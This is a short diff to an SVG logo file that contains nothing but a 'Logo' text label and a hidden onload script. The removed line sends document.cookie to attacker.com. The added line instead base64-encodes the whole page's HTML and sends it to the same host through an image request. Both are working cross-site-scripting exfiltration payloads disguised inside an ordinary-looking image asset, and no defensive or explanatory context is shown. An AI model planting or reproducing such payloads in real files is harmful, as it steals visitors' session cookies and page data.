@@ -1,3 +1,3 @@
-<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.com/steal?cookie='+document.cookie)">
+<svg xmlns="http://www.w3.org/2000/svg" onload="new Image().src='https://attacker.com/?data='+btoa(document.documentElement.innerHTML)">
   <text x="10" y="30">Logo</text>
 </svg>
